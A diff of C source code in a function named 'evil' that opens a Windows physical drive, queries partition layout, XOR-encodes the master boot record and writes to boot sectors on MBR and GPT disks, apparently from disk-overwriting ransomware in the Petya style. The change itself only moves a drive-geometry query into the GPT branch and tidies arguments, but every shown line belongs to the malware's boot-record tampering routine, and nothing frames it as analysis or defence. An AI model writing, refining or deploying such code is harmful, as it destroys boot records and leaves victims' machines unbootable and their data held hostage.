@@ -52,7 +52,7 @@ void evil()
 		ExitProcess(0);
 	}
  
-    	DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0,0, &diskExtents, sizeof(diskExtents), &wb, NULL);
+    	DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0, 0, &diskExtents, sizeof(diskExtents), &wb, 0);
 
 	CloseHandle(LogicalDrive);
 
@@ -76,9 +76,6 @@ void evil()
 	if (PhysicalDrive == INVALID_HANDLE_VALUE){
 		ExitProcess(0);
 	}
-
-	DISK_GEOMETRY OutBuffer;
-	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &OutBuffer, sizeof(OutBuffer), &wb, 0);
 
 	char XORMBR[512];
 	int sector57 = 57*512;
@@ -127,7 +124,7 @@ void evil()
 	memcpy(sector54content + 169, EncodedId + 0, 90);
 	
 	PARTITION_INFORMATION_EX info;
-	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, 0,0, &info, sizeof(info), &wb, NULL);
+	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, 0, 0, &info, sizeof(info), &wb, 0);
 	if(info.PartitionStyle == PARTITION_STYLE_MBR)
 	{
 		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
@@ -166,6 +163,9 @@ void evil()
 	}
 	else if(info.PartitionStyle == PARTITION_STYLE_GPT)
 	{
+		DISK_GEOMETRY OutBuffer;
+		DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &OutBuffer, sizeof(OutBuffer), &wb, 0);
+		
 		char gpt[512];
 		char firstLBA[512]; //FIRST LBA
 		uint8_t backup_lba[8]; //LAST LBA
